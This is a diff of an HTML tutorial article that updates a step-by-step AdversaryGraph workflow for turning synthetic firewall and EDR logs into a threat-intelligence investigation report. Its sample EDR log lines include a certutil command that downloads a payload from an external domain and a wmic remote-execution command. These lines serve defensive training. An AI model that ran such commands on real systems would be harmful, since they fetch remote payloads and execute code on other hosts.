@@ -11,19 +11,19 @@
     <meta charset="utf-8" />
     <meta name="referrer" content="strict-origin-when-cross-origin">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>From Log to Report: IOC Investigation With AdversaryGraph | 1200km</title>
-    <meta name="description" content="A practical AdversaryGraph v3 workflow: turn synthetic firewall and EDR telemetry into IOC extraction, enrichment, relationship graph review, ATT&CK leads, and an AI-assisted investigation report." />
+    <title>From Log to Report: Using AdversaryGraph to Turn Firewall and EDR Noise Into a CTI Investigation | 1200km</title>
+    <meta name="description" content="A practical AdversaryGraph v3.1 workflow: turn synthetic firewall and EDR telemetry into IOC extraction, enrichment, relationship graph review, Investigation workspace evidence, ATT&CK leads, and an AI-assisted investigation report." />
     <meta name="author" content="Andrey Pautov" />
     <meta name="keywords" content="AdversaryGraph, IOC investigation, AI log analysis, EDR log analysis, firewall logs, CTI workflow, MITRE ATT&CK, IOC enrichment, OpenCTI, VirusTotal, OTX, urlscan, Mustang Panda, RedDelta, detection engineering" />
-    <meta property="og:title" content="From Log to Report: IOC Investigation With AdversaryGraph" />
-    <meta property="og:description" content="Use AdversaryGraph to move from firewall and EDR logs to IOC enrichment, relationship graph review, ATT&CK leads, and an analyst-ready report." />
+    <meta property="og:title" content="From Log to Report: Using AdversaryGraph to Turn Firewall and EDR Noise Into a CTI Investigation" />
+    <meta property="og:description" content="Use AdversaryGraph to move from firewall and EDR logs to IOC enrichment, relationship graph review, Investigation workspace evidence, ATT&CK leads, and an analyst-ready report." />
     <meta property="og:type" content="article" />
     <meta property="og:url" content="https://1200km.com/articles/adversarygraph-from-log-to-report-ioc-investigation.html" />
-    <meta property="og:image" content="https://1200km.com/assets/adversarygraph-ai-og.png" />
+    <meta property="og:image" content="https://1200km.com/assets/adversarygraph/from-log-to-report/01-hero-platform-overview.png" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://1200km.com/assets/adversarygraph-ai-og.png" />
+    <meta name="twitter:image" content="https://1200km.com/assets/adversarygraph/from-log-to-report/01-hero-platform-overview.png" />
     <link rel="canonical" href="https://1200km.com/articles/adversarygraph-from-log-to-report-ioc-investigation.html" />
     <link rel="icon" href="../assets/favicon.png" type="image/png" />
     <link rel="stylesheet" href="../assets/site-theme.css" />
@@ -65,6 +65,8 @@
       .meta { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 18px; }
       .chip { display: inline-flex; align-items: center; border: 1px solid rgba(147,197,253,0.28); border-radius: 999px; padding: 5px 10px; color: #bfdbfe; background: rgba(13,31,60,0.78); font-size: 0.8rem; font-weight: 700; }
       .hero-img { display: block; width: 100%; margin-top: 28px; border: 1px solid rgba(147,197,253,0.28); border-radius: 12px; background: #050c1a; }
+      .article-img { display: block; width: 100%; margin: 20px 0 28px; border: 1px solid rgba(147,197,253,0.24); border-radius: 10px; background: #050c1a; }
+      .article-img.narrow { width: min(100%, 760px); }
       main { display: grid; grid-template-columns: minmax(0, 1fr) 280px; gap: 34px; padding: 42px 0 72px; }
       article { min-width: 0; background: rgba(8,19,38,0.88); border: 1px solid rgba(147,197,253,0.24); border-radius: 14px; padding: clamp(22px, 4vw, 42px); }
       aside { align-self: start; position: sticky; top: 84px; }
@@ -109,7 +111,7 @@
 
     <section class="hero">
       <div class="hero-inner">
-        <p class="eyebrow">AdversaryGraph v3.0 workflow</p>
+        <p class="eyebrow">AdversaryGraph v3.1 workflow</p>
         <h1>From Log to Report: Using AdversaryGraph to Turn Firewall and EDR Noise Into a CTI Investigation</h1>
         <p class="lead">
           A practical workflow for moving from raw telemetry to IOC extraction, enrichment, relationship graph review, ATT&amp;CK technique leads, and an analyst-ready report.
@@ -121,7 +123,7 @@
           <span class="chip">OpenCTI / OTX / VT</span>
           <span class="chip">Detection handoff</span>
         </div>
-        <img class="hero-img" src="../assets/adversarygraph-ai-og.png" alt="AdversaryGraph AI banner" />
+        <img class="hero-img" src="../assets/adversarygraph/from-log-to-report/01-hero-platform-overview.png" alt="AdversaryGraph From Log to Report workflow overview" />
       </div>
     </section>
 
@@ -132,23 +134,30 @@
         </div>
 
         <h2 id="about">About AdversaryGraph</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/02-platform-audience-infographic.png" alt="AdversaryGraph audience and workflow infographic" />
         <p>
           AdversaryGraph is a self-hosted AI-assisted CTI-to-detection workbench. It connects raw evidence, threat intelligence, ATT&amp;CK mapping, IOC enrichment, actor context, relationship graph pivots, and report generation into one local workflow.
         </p>
         <p>
-          The core path is simple: raw evidence -> IOC extraction -> enrichment -> relationship graph -> ATT&amp;CK mapping -> report.
+          The core path is simple: raw evidence -> IOC extraction -> enrichment -> relationship graph -> Investigation workspace -> ATT&amp;CK mapping -> report.
         </p>
 
         <h2 id="goal">The Investigation Goal</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/03-investigation-goal-infographic.png" alt="Investigation goal infographic showing logs, IOCs, ATT&CK, enrichment, and reporting" />
         <p>
           The analyst starts with two noisy inputs: firewall logs showing repeated outbound traffic and EDR logs showing suspicious PowerShell, discovery commands, unsigned payload staging, and remote execution leads.
         </p>
         <ol>
+          <li>Create a new Investigation workspace.</li>
           <li>Extract useful observables from raw logs.</li>
           <li>Identify suspicious behavior and likely ATT&amp;CK techniques.</li>
           <li>Send extracted IOCs into IOC Investigation.</li>
           <li>Enrich the IOCs through local DB, OpenCTI, OTX, VirusTotal, urlscan, ThreatFox, and other configured sources.</li>
           <li>Review relationships, evidence ranking, source conflicts, actor leads, and TTP leads.</li>
+          <li>Add reviewed evidence to an Investigation workspace.</li>
+          <li>Create a Navigator-like TTP layer and send it to the matrix.</li>
+          <li>Compare the TTP layer with threat actors and save the result to the investigation.</li>
+          <li>Summarize the whole investigation with AI.</li>
           <li>Generate a structured report with the AI assistant.</li>
         </ol>
 
@@ -174,12 +183,40 @@
 2026-06-20T08:32:03Z EDR process_start parent=rundll32.exe process=wmic.exe cmd="wmic.exe /node:FIN-FS-01 process call create \"cmd.exe /c whoami\""
 2026-06-20T08:36:12Z EDR process_start parent=rundll32.exe process=certutil.exe cmd="certutil.exe -urlcache -split -f http://gatewayrvcenter.com/payload.dat C:\ProgramData\Microsoft\cache.bin"</code></pre>
 
-        <h2 id="ai-analysis">Step 1: Paste Logs Into AI Log Analysis</h2>
+        <h2 id="full-flow">Full Flow Presentation</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/04-full-flow-presentation.gif" alt="Animated From Log to Report workflow in AdversaryGraph" />
+
+        <h2 id="create-investigation">Step 1: Create A New Investigation</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/05-create-new-investigation.png" alt="Create a new investigation workspace" />
         <p>
-          In <strong>AI Analysis</strong>, paste the firewall and EDR logs and ask AdversaryGraph to extract IOCs, suspicious commands, suspicious processes, possible ATT&amp;CK techniques, kill-chain context, and actor or malware leads. The prompt should explicitly say not to claim attribution and to show evidence for every finding.
+          Start from the case workspace. Open <strong>Investigation</strong> and create a new investigation before running analysis. This gives every later result a destination: firewall analysis, EDR analysis, IOC Investigation results, TTP layer, actor-comparison output, AI summary, and final report.
         </p>
 
-        <h2 id="extraction">Step 2: Extract IOCs And Suspicious Activity</h2>
+        <h2 id="firewall-analysis">Step 2: Analyze Firewall Logs</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/06-analyze-firewall-logs.gif" alt="Animated firewall log analysis in Log / PCAP mode" />
+        <p>
+          Open <strong>AI Analysis</strong>, select <strong>Log / PCAP</strong>, and paste or upload only the firewall logs first. Do not write a manual prompt. The Log / PCAP mode already uses an internal AdversaryGraph system prompt to extract IOCs, identify suspicious activity, map behavior to ATT&amp;CK, separate source evidence from enrichment leads, avoid attribution claims, and return a structured analyst result.
+        </p>
+
+        <h2 id="add-firewall">Step 3: Add Firewall Analysis To The Investigation</h2>
+        <p>
+          After the firewall analysis completes, click <strong>Add to investigation</strong> and choose the investigation created in Step 1. This saves the firewall result as structured case evidence.
+        </p>
+
+        <h2 id="edr-analysis">Step 4: Analyze EDR Logs</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/07-analyze-edr-logs.gif" alt="Animated EDR log analysis in Log / PCAP mode" />
+        <p>
+          Return to <strong>AI Analysis -> Log / PCAP</strong> and paste or upload the EDR logs as a separate analysis. Do not combine firewall and EDR logs in one run unless you intentionally want one mixed result. The cleaner workflow is one source per run.
+        </p>
+
+        <h2 id="add-edr">Step 5: Add EDR Analysis To The Investigation</h2>
+        <p>
+          After the EDR analysis completes, click <strong>Add to investigation</strong> and choose the same investigation. The case should now contain at least two evidence nodes: firewall log analysis result and EDR log analysis result.
+        </p>
+
+        <h2 id="extraction">Step 6: Extract IOCs And Suspicious Activity</h2>
+        <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/08-extracted-iocs-firewall.png" alt="Extracted firewall IOCs" />
+        <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/09-extracted-iocs-edr.png" alt="Extracted EDR IOCs" />
         <table>
           <thead><tr><th>Type</th><th>Examples</th></tr></thead>
           <tbody>
@@ -189,6 +226,8 @@
             <tr><td>Hashes</td><td>eb52d1791fc861e459ee14f15ef8d4819a4afde3ac7ce5e8cebdcd5f7840925f, fd2c2f1bf90592604febf404e5579f89</td></tr>
           </tbody>
         </table>
+        <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/10-suspicious-behaviors.png" alt="Suspicious behaviors table with source evidence" />
+        <img class="article-img narrow" src="../assets/adversarygraph/from-log-to-report/11-attack-technique-leads.png" alt="ATT&CK technique leads extracted from log evidence" />
         <table>
           <thead><tr><th>Technique lead</th><th>Why</th></tr></thead>
           <tbody>
@@ -201,19 +240,52 @@
           </tbody>
         </table>
 
-        <h2 id="ioc-investigation">Step 3: Investigate Extracted IOCs</h2>
+        <h2 id="ioc-investigation">Step 7: Investigate Extracted IOCs</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/12-ioc-investigation-input.png" alt="IOC Investigation input for a high-value indicator" />
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/13-ioc-investigation-summary.png" alt="IOC Investigation summary and source coverage" />
         <p>
           Open <strong>IOC Investigation</strong>, submit the strongest IOC, and run Tier 1 / Tier 2 / Tier 3 enrichment. AdversaryGraph queries enabled sources, including local DB, OpenCTI, OTX, VirusTotal, urlscan, ThreatFox, Malpedia, GreyNoise Community, AbuseIPDB, Shodan, and Censys when configured.
         </p>
 
-        <h2 id="graph">Step 4: Review The Relationship Graph</h2>
+        <h2 id="graph">Step 8: Review The Relationship Graph</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/14-ioc-investigation-graph.png" alt="IOC Investigation relationship graph with connected pivots" />
         <p>
           The relationship graph is the analyst pivot map. Nodes can represent the root IOC, related domains, IPs, actor leads, malware labels, tags, source references, and TTP leads. Each node can be opened or reinvestigated, and focused graph mode hides noisy context until needed.
         </p>
 
-        <h2 id="report">Step 5: Generate The Report</h2>
+        <h2 id="workspace">Step 9: Add IOC Investigation Results To The Investigation</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/15-add-ioc-result-to-investigation.png" alt="Add IOC Investigation result to the active investigation" />
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/16-investigation-workspace.png" alt="Investigation workspace with logs, behaviors, TTPs, and IOCs" />
         <p>
-          After evidence review, send the investigation context to the report workflow. A strong output includes the IOC type, suspiciousness rationale, source evidence, TTP leads, actor-lead caveats, kill-chain interpretation, recommended pivots, and defensive actions.
+          After reviewing IOC Investigation output, add the useful result to the same investigation. The workspace keeps the case structured as log analysis, report analysis, founded TTP layer, IOC list, evidence nodes, relationships, and timeline entries.
+        </p>
+        <p>
+          This step turns separate analysis screens into one auditable investigation package. The final report should use the reviewed workspace evidence instead of relying on one isolated result.
+        </p>
+
+        <h2 id="matrix">Step 10: Map TTP Leads To ATT&amp;CK</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/17-ttp-layer-on-matrix.png" alt="Investigation TTP layer displayed on the ATT&CK matrix" />
+        <p>
+          Use <strong>Show TTPs on Matrix</strong> and <strong>Add TTPs to My TTPs</strong> to create a visible ATT&amp;CK layer from the reviewed technique leads. The same layer can be compared with actor profiles, but overlap remains a hypothesis lead rather than attribution.
+        </p>
+
+        <h2 id="compare">Step 11: Compare The TTP Layer With Threat Actors</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/18-actor-comparison.png" alt="Actor comparison result for investigation TTP overlap" />
+        <p>
+          Use <strong>Compare + save result</strong> from the Investigation page. AdversaryGraph compares all TTPs in the active investigation against actor profiles and saves the top overlap leads, shared technique IDs, and similarity scores back into the case timeline.
+        </p>
+
+        <h2 id="summary">Step 12: Summarize The Investigation With AI</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/19-ai-investigation-summary.png" alt="AI investigation summary saved back into the case" />
+        <p>
+          Use <strong>Complete AI analysis</strong> to summarize the whole case: log-analysis findings, IOC investigation results, TTP layer, actor-comparison leads, source caveats, and next actions. The summary is saved as another evidence node in the investigation.
+        </p>
+
+        <h2 id="report">Step 13: Generate The Report</h2>
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/20-final-report-preview.png" alt="Final investigation report preview" />
+        <img class="article-img" src="../assets/adversarygraph/from-log-to-report/21-report-generation-workflow.gif" alt="Animated report generation workflow from investigation evidence" />
+        <p>
+          After evidence review, generate the report from the active Investigation workspace. A strong output includes the original log findings, IOC type, suspiciousness rationale, source evidence, TTP leads, actor-lead caveats, kill-chain interpretation, recommended pivots, and defensive actions.
         </p>
 
         <h2 id="why">Why This Workflow Matters</h2>
@@ -240,10 +312,18 @@
             <li><a href="#goal">Goal</a></li>
             <li><a href="#firewall">Firewall logs</a></li>
             <li><a href="#edr">EDR logs</a></li>
-            <li><a href="#ai-analysis">AI analysis</a></li>
+            <li><a href="#create-investigation">Create investigation</a></li>
+            <li><a href="#firewall-analysis">Firewall analysis</a></li>
+            <li><a href="#add-firewall">Add firewall result</a></li>
+            <li><a href="#edr-analysis">EDR analysis</a></li>
+            <li><a href="#add-edr">Add EDR result</a></li>
             <li><a href="#extraction">Extraction</a></li>
             <li><a href="#ioc-investigation">IOC investigation</a></li>
             <li><a href="#graph">Graph</a></li>
+            <li><a href="#workspace">Investigation workspace</a></li>
+            <li><a href="#matrix">ATT&amp;CK matrix</a></li>
+            <li><a href="#compare">Actor comparison</a></li>
+            <li><a href="#summary">AI summary</a></li>
             <li><a href="#report">Report</a></li>
           </ol>
           <h2>Ecosystem</h2>
